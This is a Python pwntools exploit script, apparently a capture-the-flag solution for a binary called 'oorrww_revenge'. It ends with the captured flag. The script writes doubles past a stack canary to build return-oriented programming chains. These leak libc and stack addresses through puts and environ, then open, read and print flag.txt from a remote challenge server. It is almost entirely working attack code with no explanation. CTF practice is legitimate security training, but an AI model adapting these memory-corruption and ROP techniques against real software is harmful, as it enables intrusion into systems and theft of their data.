#!/usr/bin/python3
from pwn import *
gs = '''
b *main+165
continue
'''
elf = context.binary = ELF('./oorrww_revenge')
context.terminal = ['tmux', 'splitw', '-hp', '70']
libc = elf.libc

def start():
    if args.GDB:
        return gdb.debug('./oorrww_revenge', gdbscript=gs)
    if args.REMOTE:
        return remote('193.148.168.30', 7667)
    else:
        return process('./oorrww_revenge')

def hex_to_double_as_bytes(hex_number):
    int_value = int(hex_number, 16)
    packed = struct.pack('Q', int_value)
    double_value = struct.unpack('d', packed)[0]
    double_str = f"{double_value:.16e}".encode('utf-8')
    return double_str

r = start()
#========= exploit here ===================

#1
for i in range(19):
    r.sendlineafter(b"input:",b"-") #skip canary
r.sendlineafter(b"input:",b"-")
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0x0000000000401203))) #pop rax (RBP)
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0x0000000000401203))) #pop rax
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(elf.got.puts)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0x00000000004012da))) #mov rdi, rax; call 0x20c0; nop; pop rbp; ret;
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0x404100)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0x401110))) #start
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0)))
#leaks
r.recvline()
leak = u64(r.recvline().strip().ljust(8,b"\x00"))
log.info(f"leak = {hex(leak)}")
libc.address = leak - 0x80e50
log.info(f"libc = {hex(libc.address)}")
#2
#libc gadgets
poprdi = libc.address + 0x000000000002a3e5
poprdx = libc.address + 0x000000000011f2e7
poprsi = libc.address + 0x000000000016333a
poprax = libc.address + 0x0000000000045eb0
syscall = libc.address + 0x0000000000091316
movrax2 = libc.address + 0x00000000000d8380
leave = libc.address + 0x000000000004da83

for i in range(19):
    r.sendlineafter(b"input:",b"-") #skip 

r.sendlineafter(b"input:",b"-")
r.sendlineafter(b"input:",b"-")
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(poprdi)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(1)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(poprsi)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(libc.sym.environ))) #leak stack
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(poprdx)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(8)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(libc.sym.write)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0x401110))) #start
r.recvline()
stack_leak = u64(r.recvuntil(b"oops! no more gift this time").split(b"oops! no more gift this time")[0].ljust(8,b"\x00"))
log.info(f"stack leak = {hex(stack_leak)}")
#3
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0x7478742e67616c66)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(0x0))) #wasted quadword stack is filled we need to put a \0
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(poprdi))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(3))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(poprsi))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(stack_leak+0x168))) #further on the stack
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(poprdx))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0x50))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0x0))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(libc.sym.read))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(poprdi))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(stack_leak+0x168))) #further on the stack
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(libc.sym.puts))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0xcafebabe))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0xcafebabe))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0xcafebabe))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0xcafebabe))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0xcafebabe))) 
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0xcafebabe))) 
r.sendlineafter(b"input:",b"-")
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(stack_leak-0x360)))
#0x358 + leak (jmp)
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(poprdi)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(stack_leak-0x368)))#flag.txt
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(poprsi)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex((0))))#
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(movrax2)))
r.sendlineafter(b"input:", hex_to_double_as_bytes(hex(syscall)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(leave)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0xdeadbeef)))
r.sendlineafter(b"input:",hex_to_double_as_bytes(hex(0xdeadbeef))) #start
#========= interactive ====================
r.interactive()
#L3AK{n0w_u_hav3_th3_k3y_t0_th3_inv1s1ble_ffllaagg}